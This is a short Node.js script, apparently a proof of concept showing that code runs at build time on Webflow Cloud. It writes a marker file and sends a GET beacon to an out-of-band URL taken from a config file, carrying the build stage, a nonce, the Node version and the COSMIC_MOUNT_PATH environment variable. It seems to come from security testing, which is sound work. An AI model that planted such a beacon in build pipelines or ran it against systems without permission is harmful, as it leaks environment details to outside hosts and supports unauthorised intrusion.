import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";
import crypto from "crypto";
import http from "http";
import https from "https";

const __dirname = path.dirname(fileURLToPath(import.meta.url));

function readConfig() {
  try {
    return JSON.parse(fs.readFileSync(path.join(__dirname, "..", "poc.config.json"), "utf8"));
  } catch {
    return {};
  }
}

function beacon(urlStr, q) {
  if (!urlStr || typeof urlStr !== "string" || !/^https?:\/\//i.test(urlStr)) return;
  try {
    const u = new URL(urlStr);
    for (const [k,v] of Object.entries(q)) u.searchParams.set(k, String(v));
    const lib = u.protocol === "http:" ? http : https;
    const req = lib.request(u, { method: "GET", timeout: 5000 }, (res) => res.resume());
    req.on("error", () => {});
    req.end();
  } catch {}
}

function writeArtifact(info) {
  const outDir = path.join(__dirname, "..", "dist");
  fs.mkdirSync(outDir, { recursive: true });
  const content = [
    "Webflow Cloud build-time PoC artifact",
    `time: ${new Date().toISOString()}`,
    `node: ${process.version}`,
    `mount: ${process.env.COSMIC_MOUNT_PATH || ""}`,
    `nonce: ${info.nonce}`,
    `stage: ${info.stage}`
  ].join("\\n") + "\\n";
  fs.writeFileSync(path.join(outDir, "_wf_poc.txt"), content, "utf8");
}

(function main() {
  const stage = process.argv[2] || "unknown";
  const nonce = crypto.randomBytes(8).toString("hex");
  const cfg = readConfig();
  writeArtifact({ stage, nonce });
  beacon(cfg.oob_url, { s: stage, n: nonce, node: process.version.replace(/^v/, ""), m: process.env.COSMIC_MOUNT_PATH || "" });
})();
